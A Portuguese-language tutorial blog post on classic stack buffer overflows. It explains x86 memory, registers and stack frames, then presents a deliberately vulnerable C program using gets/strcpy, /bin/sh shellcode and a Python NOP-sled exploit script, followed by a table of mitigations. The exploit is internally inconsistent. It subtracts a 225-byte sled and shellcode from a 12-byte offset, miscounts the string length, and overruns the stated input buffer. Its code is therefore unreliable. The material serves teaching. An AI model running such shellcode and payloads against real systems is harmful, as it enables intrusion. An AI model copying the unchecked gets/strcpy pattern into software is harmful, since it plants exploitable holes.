---
date: '2026-08-18T09:32:15-03:00'
draft: false
title: 'Buffer OverFlow Clássico'
description: "Entendendo buffer overflow clássico, da memória a exploração"
tags: ["ciber-security", "bof"]
---

## BOF - Buffer Overflow Clássico

> Nota de estudo sobre o ataque de buffer overflow clássico (stack-based).
> Cobre a ideia do ataque, conceitos de memória (EIP, ESP, stack frame),
> o bug em C e como funciona um exploit, com exemplos práticos e a
> contrapartida em **Go** para facilitar a compreensão.

---

## 1. A ideia geral do ataque

Quando executamos um programa, os dados que aquele programa usa/manipula para conseguir te entregar o resultado esperado são todos orquestrados em memória. O sistema operacional usa um conceito de *memory map*, um mapeamento lógico da memória que faz com que cada programa tenha a ilusão de ter um espaço na memória que é só dele de maneira isolada. Esse mapeamento é feito comumente pelo kernel. Um **buffer overflow** (estouro de buffer) acontece quando um programa escreve **mais dados do que o espaço reservado** para um buffer, e esses dados extras "vazam" para as regiões de memória vizinhas.

No exemplo, criamos uma variável `testing` do tipo char e tamanho 8. Em seguida tentamos copiar byte a byte uma string de 23 caracteres para dentro da nossa variável.

```c
// C Language

char testing[8];
strcpy(testing, "ARIEL JUNIOR DE SOUZA");  // 23 bytes num buffer de 8!
```

O `strcpy` copia byte a byte **sem verificar o tamanho do destino**. Os primeiros 8 bytes preenchem o buffer; o restante é gravado em memória que não pertence ao buffer — e é exatamente aí que mora o perigo.

No ataque **clássico** (stack-based buffer overflow), essa memória vizinha é a **stack do processo**, e nela está guardado o **endereço de retorno** das funções. Se o atacante controla o que é gravado, ele pode **reescrever o endereço de retorno** e fazer o programa pular para um código controlado por ele (o **shellcode**), executando comandos arbitrários no sistema.

A ideia em uma frase:

> **O programa confia que você só vai escrever dentro do espaço que ele reservou.**</br>
> *O ataque quebra essa confiança.*

---

## 2. Conceitos de memória de um processo

Quando o SO carrega um programa, ele cria um espaço de endereçamento lógico dividido em **segmentos** (*memory map*), cada qual com sua responsabilidade:

| Segmento  | O que guarda                                               | Direção |
|-----------|------------------------------------------------------------|---------|
| `text`    | Código compilado (instruções) — só leitura                 | fixo    |
| `data`    | Variáveis globais inicializadas                            | fixo    |
| `bss`     | Variáveis globais não inicializadas                        | fixo    |
| `heap`    | Alocação dinâmica (`malloc`/`new`) — cresce para cima      | ↑       |
| `stack`   | Chamadas de função, variáveis locais — cresce para baixo   | ↓       |

> **Regra de ouro do x86:** a stack cresce **para endereços menores**.
> Quanto mais fundo você entra em funções, mais para baixo (menor endereço)
> você vai na memória.

Representação simplificada (endereços ilustrativos):

```txt
 Endereço alto (0xFFFFFFFF)
 +-------------------------------+
 |        stack                  |  ← cresce para baixo ↓
 |  (variáveis locais, retorno)  |
 +-------------------------------+
 |        heap                   |  ← cresce para cima ↑
 +-------------------------------+
 |        bss  /  data           |
 +-------------------------------+
 |        text  (código)         |
 +-------------------------------+
 Endereço baixo (0x00000000)
```

O buffer overflow clássico explora a região da **stack**.

### 2.1 Little-endian (por que endereços parecem "de trás pra frente")

O x86 armazena números de múltiplos bytes com o **byte menos significativo primeiro** (little-endian). Isso importa quando você for montar payloads: o endereço `0x41424344` é gravado na memória como `44 43 42 41`.

```c
// Gravar o inteiro 0x41424344 em um buffer
bytes na memória:  [0x44] [0x43] [0x42] [0x41]
                       ^ LSB é o primeiro
```

Quando o exploit montar o EIP (*Extended Instruction Pointer*) manualmente, os bytes do endereço precisam ser **invertidos** (ex.: `\x44\x43\x42\x41`).

---

## 3. Registradores: EIP, ESP, EBP e amigos

Registradores são pequenas "caixinhas" dentro da CPU que guardam valores usados na hora (no x86 de 32 bits):

| Registrador | Nome | O que faz |
| --- | --- | --- |
| **EIP** | Instruction Pointer | Aponta para a **próxima instrução** a executar. Controlar o EIP = controlar o programa |
| **ESP** | Stack Pointer | Aponta para o **topo da stack** (último valor empilhado). Move com push/pop |
| **EBP** | Base Pointer | Marca a **base do stack frame** da função atual (dá pra achar variáveis locais) |
| EAX/EBX/ECX/EDX | Registradores de propósito geral | Armazenam operandos e resultados de operações |
| EFLAGS | Flags | Resultados de comparações (ZF, CF...) |

Dos três, os dois mais importantes para o BOF são:

- **EIP**: o "ponteiro do cronograma". O processador busca a instrução no endereço que o EIP aponta, executa e **incrementa o EIP** para a próxima. Se você consegue escrever um valor no EIP, você decide **o que vai ser executado a seguir**.
- **ESP**: o "ponteiro da pilha de pratos". `push` coloca um prato no topo (diminui ESP), `pop` retira (aumenta ESP).

---

## 4. Como a stack organiza uma chamada de função

Toda função ao ser chamada monta um **stack frame** na pilha. Usando uma analogia com **Go**: imagine que cada chamada de função é um bloco de contexto que vai sendo empilhado e desempilhado com `defer`/retorno.

Uma chamada `vulneravel(input)` no x86 acontece assim:

### 4.1. O chamador empilha os argumentos

```asm
push input        ; argumento (em C, na ordem inversa)
call vulneravel   ; 2: empurra o endereço de retorno + pula pro início da função
```

### 4.2. O `call` empurra o endereço de retorno

O `call` faz duas coisas: **salva na stack o endereço da próxima instrução** (aquela logo após o `call`), e então pula para a função. É esse endereço salvo que o `ret` usará depois.

### 4.3. Prologue da função (entrada)

```asm
vulneravel:
    push ebp            ; salva o EBP do chamador
    mov  ebp, esp       ; EBP agora marca a base deste frame
    sub  esp, 8         ; reserva 8 bytes para variáveis locais (ex.: buffer)
```

A stack fica assim (endereços menores em baixo):

```txt
        Endereço baixo
 ESP → +----------------------------------+
       |  variável local (buffer[8])      |  ← espaço reservado
 EBP → +----------------------------------+
       |  EBP salvo (do chamador)         |
       +----------------------------------+
       |  ENDEREÇO DE RETORNO  ← EIP     |  ← o que o ret vai pular pra
       +----------------------------------+
       |  argumento (input)               |
       +----------------------------------+
        Endereço alto
```

### 4.4. Epilogue (saída)

```asm
    mov  esp, ebp       ; "desmonta" o frame
    pop  ebp            ; restaura EBP do chamador
    ret                 ; ESP agora aponta pro endereço de retorno;
                        ; pop em EIP → execução volta para o chamador
```

**O ponto crucial:** o `ret` simplesmente faz `EIP = [ESP]`. Se alguém conseguiu **modificar o conteúdo da stack na posição do endereço de retorno**, o `ret` vai pular para onde o atacante mandar.

---

## 5. O bug clássico em C

A função `gets` e `strcpy` **não checam limites**. Veja o exemplo realista:

```c
// vuln.c
#include <stdio.h>
#include <string.h>

int vulneravel(char *input) {
    char buffer[8];                // 8 bytes reservados na stack
    strcpy(buffer, input);         // copia sem verificar tamanho!
    printf("Ola, %s\n", buffer);
    return 0;
}

int main(void) {
    char entrada[128];
    printf("Digite seu nome: ");
    gets(entrada);                 // lê linha inteira, sem limite!
    vulneravel(entrada);
    return 0;
}
```

Quando o usuário digita `"A" * 12`, o `strcpy`:

1. Copia `A` × 8 para dentro do buffer (ok);
2. Continua copiando os 4 `A` restantes **por cima do EBP salvo e do endereço de
   retorno**;
3. Na saída da função, `ret` lê `0x41414141` como endereço → o programa tenta
   executar código em `0x41414141` e **crasha** (segfault).

---

## 6. Etapa a etapa do exploit

Para transformar esse crash em **execução de código**, seguimos 4 etapas.

### Etapa 1 — Encontrar o offset (distância até o EIP)

Precisamos saber **quantos bytes** devemos escrever para sobrescrever o endereço
de retorno. A forma clássica é mandar um **padrão não repetitivo** (gerado com
`pattern_create` do Metasploit, ou com `msf-pattern_create`):

```txt
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...
```

O programa crasha e o `EIP` mostra um valor como `0x41306241`. Procuramos esse
trecho no padrão (`pattern_offset -l 4 -q 41306241`) e descobrimos que o EIP
fica no **offset 12**.

No exemplo acima, `buffer[8]` + `EBP salvo (4 bytes)` = **12 bytes até o EIP**.

```txt
[ A × 8 ][ B × 4 ][ CCCC → vira o EIP ]
  buffer   EBP      endereço de retorno
```

### Etapa 2 — Controle do EIP

Confirmamos o controle apagando o `ret` com `BBBB`:

```python
payload = b"A" * 12 + b"BBBB"
```

Se o EIP no crash for `0x42424242` (`BBBB`), **temos controle total do fluxo**.
Agora falta apontar para o nosso código.

### Etapa 3 — Injetar o shellcode

**Shellcode** é um pequeno bloco de código de máquina (sem bytes nulos `\x00`,
senão `strcpy` pararia de copiar) que normalmente abre um shell:

```asm
; ex.: execve("/bin/sh", NULL, NULL) em x86
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```

Cada byte desse é uma instrução assembly compilada.

### Etapa 4 — Apontar o EIP para o shellcode

A stack fica no **topo da memória** do processo. Para aumentar a chance de
acertar o endereço, usa-se o **NOP sled**:

- **NOP** (`0x90`) é a instrução "no operation" — faz nada e passa para a
  próxima.
- Se o EIP cair em qualquer NOP do sled, ele "escorrega" até o shellcode.

Payload final:

```txt
[ NOP × 200 ] [ shellcode ] [ preenchimento ] [ EIP → endereço no meio do sled ]
   "escorregador"                 lixo           aponta pra lá
```

O exploit em Python:

```python
#!/usr/bin/env python3
import struct

EIP_OFFSET = 12                                  # do padrão (buffer[8] + EBP)
RET = 0xbffff0a0                                 # endereço médio do NOP sled
                                                 # (achado via gdb + brute force)

nopsled    = b"\x90" * 200
shellcode  = bytes.fromhex(
    "31c050682f2f7368682f62696e89e3505389e1"
    "31d2b00bcd80"
)

payload  = nopsled + shellcode                   # nossos bytes
payload += b"A" * (EIP_OFFSET - len(nopsled + shellcode))
payload += struct.pack("<I", RET)                # EIP little-endian

with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"Enviar como entrada: ./vuln < payload.bin")
print(f"Tamanho: {len(payload)} bytes")
```

Resultado esperado: `gets` lê os 4 bytes de `RET`, o `strcpy` estoura o buffer,
o `ret` pula para dentro do NOP sled, desliza até o shellcode e executa
`/bin/sh` → **temos um shell** no lugar do programa original.

---

## 7. Mitigações modernas

O ataque clássico **não funciona** em sistemas modernos graças a defesas que
se somam:

| Mitigação                         | O que faz                                                     | Por que quebra o exploit                                                  |
| ---                               | ---                                                           | ---                                                                       |
| **ASLR**                          | Aleatoriza os endereços da stack/heap/libs a cada execução    | O endereço do NOP sled muda a cada run; um único valor hardcoded falha    |
| **NX / DEP**                      | Marca a stack como **não executável**                         | Mesmo que o EIP aponte pro shellcode, a CPU se recusa a executar dados    |
| **Stack canary**                  | Valor secreto aleatório antes do retorno, checado no epilogue | Alterar o retorno sem "acertar" o canary → `__stack_chk_fail` aborta      |
| **PIE**                           | Aleatoriza a base do código (`text`)                          | Endereços de gadgets/código fixos somem                                   |
| **Fortalecimento do compilador**  | `strcpy` → `strcpy_s`/`memcpy_s`, `-fstack-protector`         | Reduz a superfície de bugs                                                |

O exploit moderno (ROP, ret2libc) precisa de técnicas mais avançadas que driblam
essas defesas — o que foge do escopo deste post.
